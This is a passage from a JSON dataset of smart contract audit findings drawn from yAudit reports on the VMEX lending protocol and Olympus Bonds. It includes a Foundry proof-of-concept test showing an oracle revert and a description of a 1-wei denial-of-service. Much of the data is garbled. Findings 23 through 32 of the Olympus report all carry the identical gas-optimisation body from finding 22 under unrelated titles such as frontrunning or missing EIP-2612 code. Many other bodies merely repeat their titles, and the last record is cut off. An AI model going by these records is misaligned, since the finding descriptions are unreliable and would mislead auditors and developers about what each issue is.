"GenericLogic.sol#L220", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "30. oracle is retrieved twice in LendingPoolCollateralManager's _calculateAvailableCollateralToLiquidate()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "The oracle is retrieved twice to calculate the debtAssetPrice and collateralPrice", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "31. onlyLendingPoolConfigurator in aToken is unused", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "onlyLendingPoolConfigurator in aToken is unused.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "32. Cache storage variable outside loop", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "LendingPool.sol#L576: address[] memory _activeReserves = new address[]( trancheParams[trancheId].reservesCount ); for (uint256 i = 0; i < trancheParams[trancheId].reservesCount; i++) { _activeReserves[i] = _reservesList[trancheId][i]; } Here trancheParams[trancheId].reservesCount is read multiple times.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "33. Redundant checks on Chainlink oracle", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "getOracleAssetPrice() validates the price as follows: if (price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) && block.timestamp - updatedAt < SECONDS_PER_DAY) { return uint256(price); } else { return _fallbackOracle.getAssetPrice(asset); } As explained about price > int256(aggregator.minAnswer()) && price < int256(aggregator.maxAnswer()) is always true.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "34. addressesProvider.getLendingPool() can be cached outside of the loop", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "AssetMappings.sol#L67", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "35. private variable _addressesTranche is unnecessarily nested", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "_addressesTranche is defined as mapping(bytes32 => mapping(uint64 => address)) private _addressesTranche; This variable is only used to store the admin address for a tranche. _addressesTranche is accessed in several functions setTrancheAdmin(), addTrancheAdmin() and getAddressTranche() which is itself called by the onlyTrancheAdmin().", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "36. Ensure that the borrowCap and supplyCap doesn't include decimals", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "borrowCap is assumed to not have decimals in it as indicated by its usage ValidationLogic.sol#L145: require( totalDebt + amount <= borrowCap * 10**decimals, Errors.VL_BORROW_CAP_EXCEEDED ); That's the case with supplyCap too: require( supplyCap == 0 || (IAToken(reserve.aTokenAddress).totalSupply() + amount) <= supplyCap * (10**_assetMappings.getDecimals(asset)), Errors.VL_SUPPLY_CAP_EXCEEDED ); Hence, global admin has to make sure that borrowCap and supplyCap does not include the decimals. Otherwise, an absurdly high amount can be borrowed or lent.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "37. Rewards can be greater than REWARDS_VAULT balance", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "IncentivesController.sol#L159", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "38. Two instances of DistributionTypes.sol", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "math/DistributionTypes.sol types/DistributionTypes.sol", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "39. Incorrect Natpsec for getRewardsData()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "The last return parameter of getRewardsData() is incorrect.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "40. Be cautious when integrating an ERC20 token", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "Before integrating a token with Vmex protocol, make sure to do a careful review of the token. You can take a look at past hacks that have happened due to non-standard token impelmenetation: weird-erc20.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "41. Extra comment in ValidationLogic's validateTransfer() function", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "This commented out code can be removed.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "42. On-Chain price manipulation", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "42. On-Chain price manipulation", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "43. AToken initialize is missing a space on aTokenName", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "AToken.sol#L106", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "44. Not used imports", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "DefaultReserveInterestRateStrategy.sol#L8", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "45. Natspec of setBorrowingEnabled() is wrong", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "AssetMappings.sol#L130", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "46. A user can be both whitelisted and blacklisted", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "LendingPool.sol#L83 UserConfiguration.sol#L130 UserConfiguration.sol#L157", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "47. Limiting Incentives to Prevent Gas Shortages in Incentivized Assets", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "DistributionManager.sol#L130", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "48. Document missing call to aToken.handleRepayment()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "Aave V2's repay() calls handleRepayment() on the corresponding aToken: IERC20(asset).safeTransferFrom(msg.sender, aToken, paybackAmount); IAToken(aToken).handleRepayment(msg.sender, paybackAmount); <-- // missing from Vmex emit Repay(asset, onBehalfOf, msg.sender, paybackAmount); Here is the corresponding Vmex's repay(): IERC20(asset).safeTransferFrom(msg.sender, reserve.aTokenAddress, paybackAmount); emit Repay(asset, trancheId, onBehalfOf, msg.sender, paybackAmount); However, handleRepayment() is a noop as it calls to an empty function, so it doesn't affect the functionality.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "49. Incomplete Natspec for calculateUserAccountData()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "GenericLogic.sol#L179", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "50. Incorrect comment in PercentMath.sol", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "PercentageMath.sol#L21", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "51. Oracle updates bricked for Beethoven boosted pools", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "VMEXOracle.getBeethovenPrice(), when dealing with boosted pools, checks whether the first address in the boosted pools token list is the address of the pool itself, which is the case for some boosted pools (e.g.: pool 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd, as can be seen in the following screenshot). PoC pragma solidity 0.8.19; import \"forge-std/Test.sol\"; import \"forge-std/console.sol\"; interface Vault { function getPoolTokens(bytes32) external view returns(IERC20[] memory tokens, uint256[] memory balances, uint256); } interface IBalancer { function getPoolId() external returns (bytes32 poolID); } interface IERC20 {} Vault constant vault = Vault(0xBA12222222228d8Ba445958a75a0704d566BF2C8); address constant ETH_NATIVE = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; address constant WETH = 0x4200000000000000000000000000000000000006; contract PoC is Test { address[3] assets = [ 0xb1C9aC57594e9B1EC0f3787D9f6744EF4CB0A024, 0xde45F101250f2ca1c0f8adFC172576d10c12072D, 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd ]; VmexStub vmex; function setUp() external { vm.createSelectFork(\"https://endpoints.omniatech.io/v1/op/mainnet/public\"); vmex = new VmexStub(); } function test_IndexOutOfBoundsPoC() external { vm.expectRevert(); vmex.getAssetPrice(assets[2]); } } contract VmexStub { address[3] assets = [ 0xb1C9aC57594e9B1EC0f3787D9f6744EF4CB0A024, 0xde45F101250f2ca1c0f8adFC172576d10c12072D, 0x6222ae1d2a9f6894dA50aA25Cb7b303497f9BEbd ]; function getBeethovenPriceStub(address asset) internal returns(uint256) { bytes32 poolId = IBalancer(asset).getPoolId(); ( IERC20[] memory tokens, , ) = vault.getPoolTokens(poolId); uint256 i = 0; if(address(tokens[0]) == asset) { //boosted tokens first token is itself i = 1; } uint256[] memory prices = new uint256[](tokens.length-i); while(i 0); i++; } // ... return prices[0]; } function getAssetPrice(address asset) public returns(uint256) { if (assets[0] != asset && assets[1] != asset && assets[2] != asset) { // if asset is a base type return mock price return 0x01; } else { // else we're managing a beethoven lp return getBeethovenPriceStub(asset); } } } If this condition holds, the function attempts to skip over the first token of the list by setting an index variable i = 1. The issue with this is that right after, the prices array is initialized as uint256[] memory prices = new uint256[](tokens.length - 1) and then a loop is performed while i < tokens.length: within the loop body, the code retrieves stores prices[i] = getAssetPrice(). At the final iteration, when i = tokens.length - 1, the write to prices[tokens.length - 1] will fail with an Index out of bounds exception.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "52. UserConfiguration.isEmpty() is always false for whitelisted or blacklisted users", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "UserConfiguration.isEmpty() checks if UserConfiguration Map is empty with: return self.data == 0; The first 2 bits of self.data are for blacklisting and whitelisting, so if a user is whitelisted or blacklisted, isEmpty() will return false even if he has no assets. This does not impact GenericLogic.calculateUserAccountData() where isEmpty() is used, since userConfig.isUsingAsCollateralOrBorrowing(vars.i) will always be false and vars.totalCollateralInETH will be 0. The value returned will be (0, 0, 0, 0, type(uint256).max, 0) despite the issue.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "53. Events not emitted for important state changes", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "When changing state variables, events are not emitted. Emitting events allows off-chain monitoring. setPermissionlessTranches() and addWhitelisterAddress() don't emit events.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "54. Unused inherited Ownable contract", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "54. Unused inherited Ownable contract", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "55. Incorrect interface used", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "Instead of using IERC20 interface in _deposit() function while checking the users asset balance IATOKEN interface is used DepositWithdrawLogic.sol vars.amount = IAToken(vars.asset).balanceOf(msg.sender);", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "56. Natspec about the distribution of interest between depositors, pool owners, and Vmex in DefaultReserveInterestRateStrategy.sol is incorrect", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "The comment states that the interest given to the pool admin treasury is equal to borrow interest rate * reserve factor * (1 - VMEX Reserve Factor). However, the pool admin treasury receives borrow interest rate * reserve factor as seen in the _mintToTreasury function.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "57. Dos due to _checkNoLiquidity()", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "_checkNoLiquidity() checks if available liquidity is equal to zero. An attacker can send 1 wei of asset to the aToken address, which would cause a revert. This would make it impossible for the global admin to deactivate the reserve and tranche admin to set collateralEnabled to false. function _checkNoLiquidity(address asset, uint64 trancheId) internal view { DataTypes.ReserveData memory reserveData = pool.getReserveData( asset, trancheId ); uint256 availableLiquidity = IERC20Detailed(asset).balanceOf( reserveData.aTokenAddress ); require( availableLiquidity == 0 && reserveData.currentLiquidityRate == 0, Errors.LPC_RESERVE_LIQUIDITY_NOT_0 ); }", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "58. Blacklisted users are considered by the system to have active borrows", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "As a part of the changes to the AAVE v2 protocol, VMEX added whitelist/blacklist functionality. A user's inclusion in these lists is determined by the most significants bits in their UserConfiguration.data bitmap. Consider the most significant bits below, as well the way that isBorrowingAny() is performed: UserConfiguration.data whitelisted user 0b10000000000000000000000... blacklisted user 0b01000000000000000000000... BORROWING_MASK 0b01010101010101010101010... function isBorrowingAny(...) internal pure returns (bool): return self.data & BORROWING_MASK != 0; This will return true for a blacklisted user. Most of the other functions in UserConfiguration account for the added whitelist/blacklist most significant bits, but isBorrowingAny() does not. There is little impact to the system however, as isBorrowingAny() is only called at the beginning of GenericLogic.balanceDecreaseAllowed() to short circuit and return early to save gas. There is no risk from this that a user is borrowing and isBorrowingAny() returns they are not, just a false positive (i.e. they are blacklisted + not borrowing). This will then then be caught by either the !userConfig.isUsingAsCollateral(...) check, which will return accurately for the specific collateral, or the later check for if (vars.totalDebtInETH == 0) {return true;}. function balanceDecreaseAllowed(...) external returns (bool) { if ( !userConfig.isBorrowingAny() || !userConfig.isUsingAsCollateral( reservesData[params.asset][params.trancheId].id ) ) { return true; } ... (...,vars.totalDebtInETH,,...,,...) = calculateUserAccountData(...); if (vars.totalDebtInETH == 0) { return true; }", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "59. getFlags() and getFlagsMemory() will revert when asset is not active/allowed", "html_url": "https://github.com/yAudit/reports/blob/main/md/06-2023-VMEX.md", "body": "ReserveConfiguration.getFlags() is called to retrieve if a reserve is active, frozen and borrowable. However, if the asset is not active then it will revert because of a check in AssetMapping.getAssetBorrowable(): require(assetMappings[asset].isAllowed, Errors.AM_ASSET_NOT_ALLOWED);", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Callback customization allows arbitrary contract execution", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "1. Callback customization allows arbitrary contract execution", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "2. Missing logical protections in setIntervals()", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "2. Missing logical protections in setIntervals()", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "3. BCV decrease design does not give market owner optimal price", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "3. BCV decrease design does not give market owner optimal price", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "4. totalDebt value overwritten", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "4. totalDebt value overwritten", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "5. Values grow quickly near end of market", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "5. Values grow quickly near end of market", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "6. Inaccurate assumption about scaleAdjustment", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "6. Inaccurate assumption about scaleAdjustment", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "7. Anyone can trigger a market closure", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "7. Anyone can trigger a market closure", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "8. Missing zero case checks", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "8. Missing zero case checks", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "9. Incompatible with fee-on-transfer tokens", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "9. Incompatible with fee-on-transfer tokens", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "10. Use != 0 for gas savings", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "10. Use != 0 for gas savings", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "11. Unnecessary zero initialization", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "11. Unnecessary zero initialization", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "12. Use prefix in loops", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "There are several instances of this finding: https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/BondAggregator.sol#L177 https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/BondAggregator.sol#L180 https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/BondAggregator.sol#L186 https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/BondAggregator.sol#L191 https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/OlympusTreasuryCallback.sol#L74", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "13. Cache array length before loop", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "13. Cache array length before loop", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "14. Bitshift is cheaper for powers of two", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "14. Bitshift is cheaper for powers of two", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "15. Remove unused functions from imported libraries", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "15. Remove unused functions from imported libraries", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "16. Remove unused variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "16. Remove unused variable", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "17. Cache variable for reuse", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "17. Cache variable for reuse", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "18. Tidy up _handlePayout logic", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "18. Tidy up _handlePayout logic", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "19. Redundant return variable", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "19. Redundant return variable", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "20. Use unchecked when no risk of overflow or underflow", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "20. Use unchecked when no risk of overflow or underflow", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "21. Move variable assignment to avoid overwrite", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "21. Move variable assignment to avoid overwrite", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "22. Using simple comparison", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "23. Bond purchase size does not impact price", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "24. Frontrunning changes price", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "25. Unclear if default tuning parameters are optimal", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "26. Add a check to limit debtBuffer to 100%", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "27. Function format inconsistency", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "28. Variable name nitpick", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "29. TransferHelper.sol not from solmate", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "30. CloneERC20.sol missing EIP-2612 code", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "31. Incorrect comment", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "32. Confusing variable naming", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains 